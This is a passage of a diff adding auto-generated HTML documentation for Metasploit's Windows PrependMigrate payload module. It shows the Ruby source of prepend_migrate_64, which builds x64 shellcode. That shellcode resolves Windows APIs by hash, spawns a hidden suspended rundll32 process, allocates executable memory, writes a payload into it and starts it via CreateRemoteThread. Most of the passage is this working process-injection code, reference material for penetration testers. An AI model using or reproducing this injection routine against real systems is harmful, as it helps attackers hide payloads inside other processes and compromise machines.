+  <h3 class="signature " id="prepend_migrate?-instance_method">
+  
+    #<strong>prepend_migrate?</strong>  &#x21d2; <tt>Boolean</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the state of the PrependMigrate option See <a href="https://github.com/rapid7/metasploit-framework/pull/917">github.com/rapid7/metasploit-framework/pull/917</a> for discussion.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+29
+30
+31</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 29</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate?'>prepend_migrate?</span>
+  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrate</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="prepend_migrate_64-instance_method">
+  
+    #<strong>prepend_migrate_64</strong>(buf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414
+415
+416
+417
+418
+419
+420
+421
+422
+423
+424
+425
+426
+427
+428
+429
+430
+431
+432
+433
+434
+435
+436
+437
+438
+439
+440
+441
+442
+443
+444
+445
+446
+447
+448
+449
+450
+451
+452
+453
+454
+455
+456
+457
+458
+459
+460
+461
+462
+463
+464
+465
+466
+467
+468
+469
+470
+471
+472
+473
+474
+475
+476
+477
+478
+479
+480
+481
+482
+483
+484
+485
+486
+487
+488
+489
+490
+491
+492
+493
+494
+495
+496
+497
+498
+499
+500
+501
+502
+503
+504
+505
+506
+507
+508
+509
+510
+511
+512
+513
+514
+515
+516
+517
+518
+519
+520
+521
+522
+523
+524
+525
+526
+527
+528
+529
+530
+531
+532
+533
+534
+535
+536
+537
+538
+539
+540
+541
+542
+543
+544
+545
+546
+547</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 301</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate_64'>prepend_migrate_64</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_payloadsize'>payloadsize</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
+  <span class='id identifier rubyid_procname'>procname</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rundll32</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># Prepare instructions to get address of block_api into ebp
+</span>  <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    call start
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>  api_call:
+    push r9                  ; Save the 4th parameter
+    push r8                  ; Save the 3rd parameter
+    push rdx                 ; Save the 2nd parameter
+    push rcx                 ; Save the 1st parameter
+    push rsi                 ; Save RSI
+    xor rdx, rdx             ; Zero rdx
+    mov rdx, [gs:rdx+96]     ; Get a pointer to the PEB
+    mov rdx, [rdx+24]        ; Get PEB-&gt;Ldr
+    mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
+  next_mod:                  ;
+    mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
+    movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
+    xor r9, r9               ; Clear r9 which will store the hash of the module name
+  loop_modname:              ;
+    xor rax, rax             ; Clear rax
+    lodsb                    ; Read in the next byte of the name
+    cmp al, &#39;a&#39;              ; Some versions of Windows use lower case module names
+    jl not_lowercase         ;
+    sub al, 0x20             ; If so normalise to uppercase
+  not_lowercase:             ;
+    ror r9d, 13              ; Rotate right our hash value
+    add r9d, eax             ; Add the next byte of the name
+    loop loop_modname        ; Loop untill we have read enough
+    ; We now have the module hash computed
+    push rdx                 ; Save the current position in the module list for later
+    push r9                  ; Save the current module hash for later
+    ; Proceed to itterate the export address table
+    mov rdx, [rdx+32]        ; Get this modules base address
+    mov eax, dword [rdx+60]  ; Get PE header
+    add rax, rdx             ; Add the modules base address
+    mov eax, dword [rax+136] ; Get export tables RVA
+    test rax, rax            ; Test if no export address table is present
+    jz get_next_mod1         ; If no EAT present, process the next module
+    add rax, rdx             ; Add the modules base address
+    push rax                 ; Save the current modules EAT
+    mov ecx, dword [rax+24]  ; Get the number of function names
+    mov r8d, dword [rax+32]  ; Get the rva of the function names
+    add r8, rdx              ; Add the modules base address
+    ; Computing the module hash + function hash
+  get_next_func:             ;
+    jecxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module
+    dec rcx                  ; Decrement the function name counter
+    mov esi, dword [r8+rcx*4]; Get rva of next module name
+    add rsi, rdx             ; Add the modules base address
+    xor r9, r9               ; Clear r9 which will store the hash of the function name
+    ; And compare it to the one we want
+  loop_funcname:             ;
+    xor rax, rax             ; Clear rax
+    lodsb                    ; Read in the next byte of the ASCII function name
+    ror r9d, 13              ; Rotate right our hash value
+    add r9d, eax             ; Add the next byte of the name
+    cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
+    jne loop_funcname        ; If we have not reached the null terminator, continue
+    add r9, [rsp+8]          ; Add the current module hash to the function hash
+    cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
+    jnz get_next_func        ; Go compute the next function hash if we have not found it
+    ; If found, fix up stack, call the function and then value else compute the next one...
+    pop rax                  ; Restore the current modules EAT
+    mov r8d, dword [rax+36]  ; Get the ordinal table rva
+    add r8, rdx              ; Add the modules base address
+    mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
+    mov r8d, dword [rax+28]  ; Get the function addresses table rva
+    add r8, rdx              ; Add the modules base address
+    mov eax, dword [r8+4*rcx]; Get the desired functions RVA
+    add rax, rdx             ; Add the modules base address to get the functions actual VA
+    ; We now fix up the stack and perform the call to the drsired function...
+  finish:
+    pop r8                   ; Clear off the current modules hash
+    pop r8                   ; Clear off the current position in the module list
+    pop rsi                  ; Restore RSI
+    pop rcx                  ; Restore the 1st parameter
+    pop rdx                  ; Restore the 2nd parameter
+    pop r8                   ; Restore the 3rd parameter
+    pop r9                   ; Restore the 4th parameter
+    pop r10                  ; pop off the return address
+    sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
+                             ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
+    push r10                 ; push back the return address
+    jmp rax                  ; Jump into the required function
+    ; We now automagically return to the correct caller...
+  get_next_mod:              ;
+    pop rax                  ; Pop off the current (now the previous) modules EAT
+  get_next_mod1:             ;
+    pop r9                   ; Pop off the current (now the previous) modules hash
+    pop rdx                  ; Restore our position in the module list
+    mov rdx, [rdx]           ; Get the next module
+    jmp next_mod             ; Process this module
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='comment'># Prepare default exit block (sleep for a long long time)
+</span>  <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    ;sleep
+    xor rcx,rcx
+    dec rcx                   ; rcx = -1
+    mov r10d, 0xE035F044      ; hash( &quot;kernel32.dll&quot;, &quot;Sleep&quot; )
+    call rbp                  ; Sleep( ... );
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='comment'># Check to see if we can find x64 exitfunc in the payload
+</span>  <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span>
+    <span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x + payload - exitblock</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>-</span> <span class='int'>5</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exitblock:\njmp $+</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    pop rbp                   ; Pop off the address of &#39;api_call&#39; for calling later.
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># Check if we can find block_api in the payload
+</span>  <span class='id identifier rubyid_block_api'>block_api</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+  <span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_block_api'>block_api</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_block_api_index'>block_api_index</span>
+
+    <span class='comment'># Prepare instructions to calculate address
+</span>    <span class='id identifier rubyid_rbp_offset'>rbp_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>+</span> <span class='int'>5</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>      jmp close_to_payload
+    return_from_close_to_payload:
+      pop rbp
+      add rbp, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_rbp_offset'>rbp_offset</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+</span><span class='heredoc_end'>    EOS
+</span>    <span class='comment'># Clear now-unneeded instructions
+</span>    <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    close_to_payload:
+      call return_from_close_to_payload
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>end</span>
+
+  <span class='comment'>#put all pieces together
+</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    cld                       ; Clear the direction flag.
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_start'>block_api_start</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  start:
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_rbp_asm'>block_api_rbp_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    ; get our own startupinfo at esp+0x60
+    add rsp,-400              ; adjust the stack to avoid corruption
+    lea rcx,[rsp+0x30]
+    mov r10d, 0xB16B4AB1      ; hash( &quot;kernel32.dll&quot;, &quot;GetStartupInfoA&quot; )
+    call rbp                  ; GetStartupInfoA( &amp;si );
+
+    jmp getcommand
+  gotcommand:
+    pop rsi                   ; rsi = address of process name (command line)
+
+    ; create the process
+    push 0                    ; keep the stack aligned
+    lea rdi,[rsp+0x120]       ; Offset of empty space for lpProcessInformation
+    push rdi                  ; lpProcessInformation : write processinfo here
+    lea rcx,[rsp+0x60]
+    push rcx                  ; lpStartupInfo : current info (read)
+    xor rcx,rcx
+    push rcx                  ; lpCurrentDirectory
+    push rcx                  ; lpEnvironment
+    push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
+    push rcx                  ; bInHeritHandles
+    mov r9, rcx               ; lpThreadAttributes
+    mov r8, rcx               ; lpProcessAttributes
+    mov rdx, rsi              ; lpCommandLine
+    ; rcx is already zero     ; lpApplicationName
+    mov r10d, 0x863FCC79      ; hash( &quot;kernel32.dll&quot;, &quot;CreateProcessA&quot; )
+    call rbp                  ; CreateProcessA( &amp;si );
+
+    ; if we didn&#39;t get a new process, use this one
+    test rax,rax
+    jz payload                ; If process creation failed, jump to shellcode
+
+  goodProcess:
+    ; allocate memory in the process (VirtualAllocEx())
+    ; get handle
+    push 0x40                 ; RWX
+    mov r9,0x1000             ; 0x1000 = MEM_COMMIT
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>4096</span>
+    <span class='comment'># probably stageless, so we don&#39;t have shellcode size constraints,
+</span>    <span class='comment'># and so we can just set r8 to the size of the payload
+</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    mov r8, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; stageless size
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>else</span>
+    <span class='comment'># otherwise we&#39;ll juse reuse r9 (4096) for size
+</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    mov r8,r9                 ; size
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    xor rdx,rdx               ; address
+    mov rcx, [rdi]            ; handle
+    mov r10d, 0x3F9287AE      ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot; )
+    call rbp                  ; VirtualAllocEx( ...);
+
+    ; eax now contains the destination - save in ebx
+    mov rbx, rax              ; lpBaseAddress
+    ; WriteProcessMemory()
+    push rsp                  ; lpNumberOfBytesWritten
+    mov r9, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; nSize
+    ; pick up pointer to shellcode &amp; keep it on stack
+    jmp begin_of_payload
+    begin_of_payload_return:
+    pop r8                    ; lpBuffer
+    mov rdx, rax              ; lpBaseAddress
+    mov rcx, [rdi]            ; hProcess
+    mov r10d, 0xE7BDD8C5      ; hash( &quot;kernel32.dll&quot;, &quot;WriteProcessMemory&quot; )
+    call rbp                  ; WriteProcessMemory( ...);
+
+    ; run the code (CreateRemoteThread())
+    xor rcx, rcx              ; rdx = 0
+    push rcx                  ; lpthreadID
+    push rcx                  ; run immediately
+    push rcx                  ; no parameter
+    mov r9,rbx                ; shellcode
+    mov r8, rcx               ; stacksize
+    ;rdx already equals 0     ; lpThreadAttributes
+    mov rcx, [rdi]
+    mov r10d, 0x799AACC6      ; hash( &quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot; )
+    call rbp                  ; CreateRemoteThread( ...);
+
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock'>exitblock</span><span class='embexpr_end'>}</span><span class='tstring_content'>              ; jmp to exitfunc or long sleep
+
+  getcommand:
+    call gotcommand
+    db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_procname'>procname</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
+    db 0x00
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  begin_of_payload:
+    call begin_of_payload_return
+  payload:
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:43 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
